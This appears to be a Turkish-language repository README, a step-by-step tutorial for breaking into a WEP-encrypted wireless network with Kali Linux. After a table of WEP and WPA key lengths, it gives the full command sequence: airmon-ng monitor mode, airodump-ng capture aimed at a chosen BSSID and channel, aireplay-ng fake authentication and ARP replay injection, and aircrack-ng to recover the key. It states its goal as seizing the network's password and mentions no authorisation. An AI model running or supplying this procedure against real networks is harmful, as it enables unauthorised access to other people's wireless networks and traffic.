# Kablosuz-Ag-Ele-Gecirme-Wep-Hacking
Adım adım Kali ile Wep Hacking

ADIM ADIM KALİ İŞLETİM SİSTEMİ İLE  KABLOSUZ AĞ ELE GEÇİRME – WEP HACKING
Bu çalışmada WEP şifrelemesini kullanan bir kablosuz ağ sisteminin şifresini ele geçirmek hedeflenmektedir.

WEP (Wired Equivalent Privacy)  Şifreleme Tekniğine Göre Kullanılabilecek Anahtar Uzunlukları 
Hexadecimal ASCII 
64bit (40+24) 0-9 ve A-F arası 10 karakter A-Z ve 0-9 arası 5 karakter 
128bit (104+24) 0-9 ve A-F arası 26 karakter A-Z ve 0-9 arası 13 karakter 
256bit (232+24) 0-9 ve A-F arası 58 karakter A-Z ve 0-9 arası 29 karakter 
WPA (Wi-Fi Protected Access) 
Hexadecimal ASCII 
128bit-256bit 0-9 ve A-F arası 64 karakter A-Z ve 0-9 arası 63 karakter 

Kali ile VM üzerinden Kablosuz ağları görüntüleyebilmek için USB Wireless Card’a ihtiyaç duyulmaktadır. Bu yüzden işlem USB’ye yüklenmiş, Live Kali üzerinden gerçekleştirilmiştir.

İlk önce kablosuz kartı bulmak için “airmon-ng” komutu çalıştırılır. Bizim durumumuzda “wlan0” kablosuz kartı gözükmektedir.

 

Kablosuz kartımızı aşağıdaki komut ile monitör moduna alıyoruz.
# airmon-ng start wlan0

 

İleride hata almamak için yukarıdaki komut sonrası PID’leri listelenen tüm süreçleri sonlandırıyoruz.

#kill 3094
#kill 3204

Monitor modun hangi monx’de aktif olduğunu görebiliriz. Bizim durumumuzda “mon0”.

#airodump-ng mon0 komutu ile erişim alanımızdaki kablosuz ağları görebiliriz.

Burada kullanacağımız alanlar;
BSSID: Mac  Adres
CH : Kanal
PWR : Kart tarafından raporlanan sinyal seviyesi. 
ESSID : Kablosuz Ağ Adı

Üzerinde çalışmak istediğimiz ağın CH ve BSSID lerini kullanarak aşağıdaki kodu çalıştırıyoruz.

#airodump-ng –w BTG –c 4 --bssid ( MAC) mon0
Burada w ile kayıt yapılacak paket adı girilir. –c kullanacağımız kablosuz ağın CH değerini alır. –b ise BSSID değerini alır.

 
.cap dosyasını kullanarak WEP şifresinin çözümlenebilmesi için ortalama 10-15 bin paket aktarımı yapılması gerekmektedir.  Bu değeri DATA alanında görebiliriz. Eğer Data çok yavaş artıyorsa 

#aireplay-ng -1 0 –a (BSSID) mon0
-1 : fake authentication

Association succesfull  (AID:1) alırsak atak başlatıp arp paketleri ile Data sayısını arttırabiliriz.

#aireplay-ng -3 –b (BSSID) mon0

 
Burada arp requestleri gönderilmeye başlanır. Bu şekilde istediğimiz Data seviyesine ulaşmış oluruz.

Yeterli paket sayısına ulaştığımızda aşağıdaki komutu kullanarak şifreyi kırabiliriz.
# aircrack-ng BTG-01.cap 
 



